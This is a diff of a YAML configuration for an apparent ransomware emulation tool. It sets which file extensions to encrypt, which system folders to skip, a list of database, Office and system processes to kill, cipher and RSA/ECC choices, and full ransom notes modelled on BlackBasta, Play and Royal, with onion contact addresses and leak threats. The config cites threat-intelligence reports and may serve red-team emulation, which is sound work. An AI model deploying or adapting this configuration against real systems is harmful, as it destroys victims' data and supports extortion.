@@ -1,21 +1,276 @@
-file_name_skips:
-  -
-file_extension_skips:
-  -
-directory_skips:
-  -
-process_kill_names:
-  -
-groups:
+# go run github.com/abakum/embed-encrypt - When config updates, use this to regenerate necessary data.
+full_encryption_max_bytes: 1024 # If a file size in bytes is < this number, will always encrypt entire file
+file_name_skips: # No matter what, will skip files containing these strings in the name
+  - readme
+  - bootmgr
+  - OUT
+  - NTUSER
+file_extension_skips: # No matter what, will skip files with these extensions
+  - .exe
+  - .dll
+  - .lnk
+  - .sys
+  - .msi
+  - .bat
+directory_skips: # No matter what, will skip directories containing these strings in the name
+  - Windows
+  - Tor browser
+  - $Recycle.Bin
+  - $windows.~ws
+  - $windows.~bt
+  - Mozilla
+  - Google
+  - Application Data
+  - boot
+  - Local Settings
+process_kill_names: # If -kill flag, will attempt to stop these processes (if running) on target machine
+  - "vmms.exe"
+  - "msaccess.exe"
+  - "mspub.exe"
+  - "svchost.exe"
+  - "vmcompute.exe"
+  - "notepad.exe"
+  - "ocautoupds.exe"
+  - "ocomm.exe"
+  - "ocssd.exe"
+  - "oracle.exe"
+  - "onenote.exe"
+  - "outlook.exe"
+  - "powerpnt.exe"
+  - "explorer.exe"
+  - "sql.exe"
+  - "steam.exe"
+  - "synctime.exe"
+  - "vmwp.exe"
+  - "thebat.exe"
+  - "thunderbird.exe"
+  - "visio.exe"
+  - "winword.exe"
+  - "wordpad.exe"
+  - "xfssvccon.exe"
+  - "TeamViewer.exe"
+  - "agntsvc.exe"
+  - "dbsnmp.exe"
+  - "dbeng50.exe"
+  - "encsvc.exe"
+file_extension_targets: # Will only target files with these extensions
+  - .$er
+  - .4dd
+  - .4dl
+  - .abcddb
+  - .abs
+  - .abx
+  - .ac
+  - .accdb
+  - .accdc
+  - .accde
+  - .accdr
+  - .accdt
+  - .accdw
+  - .accft
+  - .adb
+  - .ade
+  - .adf
+  - .adn
+  - .adp
+  - .alf
+  - .anb
+  - .aq
+  - .arc
+  - .ask
+  - .bak
+  - .bcp
+  - .bdf
+  - .bin
+  - .btr
+  - .cat
+  - .cdb
+  - .ckp
+  - .cma
+  - .cpd
+  - .crypt
+  - .crypt1
+  - .crypt10
+  - .crypt12
+  - .crypt14
+  - .crypt15
+  - .crypt5
+  - .crypt6
+  - .crypt7
+  - .crypt8
+  - .crypt9
+  - .csv
+  - .dacpac
+  - .dad
+  - .daschema
+  - .dat
+  - .db
+  - .db-shm
+  - .db-wal
+  - .db2
+  - .db3
+  - .dbc
+  - .dbcrypt
+  - .dbcrypt8
+  - .dbf
+  - .dbs
+  - .dbt
+  - .dbv
+  - .dbx
+  - .dcb
+  - .dct
+  - .dcx
+  - .ddl
+  - .dlis
+  - .docx
+  - .docm
+  - .dp1
+  - .dqy
+  - .dsk
+  - .dsn
+  - .dtsx
+  - .dxl
+  - .eco
+  - .ecx
+  - .edb
+  - .epim
+  - .exb
+  - .fcd
+  - .fdb
+  - .fic
+  - .fm5
+  - .fmp
+  - .fmp12
+  - .fmpsl
+  - .fol
+  - .fp3
+  - .fp4
+  - .fp5
+  - .fp7
+  - .fpt
+  - .frm
+  - .gdb
+  - .grdb
+  - .gwi
+  - .hdb
+  - .his
+  - .hjt
+  - .ib
+  - .ibd
+  - .icg
+  - .icr
+  - .idb
+  - .ihx
+  - .itdb
+  - .itw
+  - .jet
+  - .jtx
+  - .kdb
+  - .kexi
+  - .kexic
+  - .kexis
+  - .ldf
+  - .lgc
+  - .log1
+  - .luminar
+  - .lut
+  - .lwx
+  - .maf
+  - .maq
+  - .mar
+  - .mas
+  - .mav
+  - .maw
+  - .mdb
+  - .mdf
+  - .mdn
+  - .mdt
+  - .mpd
+  - .mrg
+  - .mud
+  - .mwb
+  - .myd
+  - .myi
+  - .ndf
+  - .ns2
+  - .ns3
+  - .ns4
+  - .nsf
+  - .nv
+  - .nv2
+  - .nwdb
+  - .nyf
+  - .odb
+  - .oqy
+  - .ora
+  - .orx
+  - .owc
+  - .pdf
+  - .p96
+  - .p97
+  - .pan
+  - .pdb
+  - .pdm
+  - .pnz
+  - .qbw
+  - .qry
+  - .qvd
+  - .rar
+  - .rbf
+  - .rctd
+  - .rod
+  - .rodx
+  - .rpd
+  - .rsd
+  - .sav
+  - .sbf
+  - .scx
+  - .sdb
+  - .sdc
+  - .sdf
+  - .sdy
+  - .sis
+  - .spq
+  - .sql
+  - .sqlite
+  - .sqlite3
+  - .sqlitedb
+  - .te
+  - .temx
+  - .tmd
+  - .tps
+  - .trc
+  - .trm
+  - .txt
+  - .udb
+  - .udl
+  - .usr
+  - .v12
+  - .vis
+  - .vpd
+  - .vvv
+  - .wdb
+  - .wmdb
+  - .wrk
+  - .xdb
+  - .xld
+  - .xlsm
+  - .xlsx
+  - .xmlff
+  - .zip
+groups: # When using a named group, will randomly select an extension and note name to apply - can use %R to generate random alpha-numeric character in extension and note contents
   - group: BlackBasta
     extension_method: append
     extensions:
       - basta
-      - '%R%R%R%R%R%R%R%R%R' #% %RAN% indicates random letter or digit
-    cipher: XChaCha20
+      - '%R%R%R%R%R%R%R%R%R'
+    cipher: xchacha20
+    asym: rsa
     notes:
       - readme.txt
       - instructions_read_me.txt
+    references:
+      - https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-blackbasta
     note: |
       ATTENTION!
       Your network has been breached and all data was encrypted.  Please contact us at:
@@ -44,40 +299,62 @@ groups:
       They usually fail.  So speak for yourself.
       
       Waiting you in a chat.
-  - group: RansomHub   # Technically RansomHub has been observed using ECC/ECDH for asym but we use RSA https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-ransomhub
-    extension_method: append  # RSA achieves similar effect anyways
+  - group: RansomHub   # Technically RansomHub has been observed using ECC/ECDH for asym but we use RSA
+    extension_method: append
     extensions:
       - basta
       - '%R%R%R%R%R%R%R%R%R' #% %RAN% indicates random letter or digit
     cipher: aes256
+    asym: ecc
     notes:
       - How To Restore Your Files.txt
+    references:
+      - https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-ransomhub
     note: |
-      ATTENTION!
-      Your network has been breached and all data was encrypted.  Please contact us at:
+      TODO
+  - group: Play
+    extension_method: append
+    extensions:
+      - play
+    cipher: aes256
+    asym: rsa
+    notes:
+      - ReadMe.txt
+    references:
+      - https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-play
+    note: |
+      PLAY
+      %R%R%R%R%R%R%R%R%R%R%R%R%R%R%R@gmx.com
+  - group: Royal
+    extension_method: append
+    extensions:
+      - royal
+    cipher: aes256
+    asym: rsa
+    notes:
+      - README.txt
+    references:
+      - https://www.cybereason.com/blog/royal-ransomware-analysis
+    note: |
+      Hello!
       
+      If you are reading this, it means that your system were hit by Royal ransomware.
+      Please csontact us via:
+      royal2xthig3ou5hd7zsliqagy6yygk2cdelaxtni2fyad6dpmpxedid.onion
       
-      bastad5huzwkepdixedg2gekg7jk22ato24zyllp6lnjx7wdtyctgvyd.onion
+      In the meantime, let us explain this case. It may seem complicated, but it is not!
+      Most likely what happened was that you decided to save some money on your security infrastructure.
+      Alas, as a result your critical data was not only encrypted but also copied from your system on a secure server.
+      From there it can be published online. Then anyone on the internet from darknet criminals, ACLU journalists, Chinese government(different names for the same thing),
+      and even your employees will be able to see your internal documentation: personal data, HR reviews, internal lawsuits and complaints, financial reports, accounting, intellectual property and more!
       
+      Fortunately we got you covered!
       
-      Login ID: %R%R%R%R%R%R%R%R-%R%R%R%R-%R%R%R%R-%R%R%R%R-%R%R%R%R%R%R%R%R%R%R%R%R
+      Royal offers you a unique deal. For a modest royalty (got it; got it ?) for our pentesting services we will not only provide you with an amazing risk mitigation service,
+      covering you from reputational, legal, financial and insurance risks, but will also provide you with a security review for your systems.
       
-      *!* To access .onion website download and install Tor Browser at:
+      To put it simply, your files will be decrypted, your data restored and kept confidential, and your systems will stay in safe.
       
-        https://www.torproject.org/ (Tor Browser is not related to us)
-      
-      *!* TO restore all your PCs and get your network working again, follow these instructions:
-      
-      - Any attempts to modify, decrypt or rename the files will lead to its fatal corruption.  It doesn't matter, who are 
-      trying to do this, either it will be your IT guys or a recovery agency.
-      
-      Please follow these simple rules to avoid data corruption:
-      
-      - Do not modify, rename or delete files.  Any attempts to modify, decrypt ot rename the files will lead to its fatal corruption.
-      
-      - Do not hire a recovery company.  They can't decrypt without the key.
-      They also don't care about your business.  They believe that they are good negotiators, but it is not.  
-      They usually fail.  So speak for yourself.
-      
-      Waiting you in a chat.
+      Contact us through TOR browser using the link:
+      royal2xthig3ou5hd7zsliqagy6yygk2cdelaxtni2fyad6dpmpxedid.onion
     
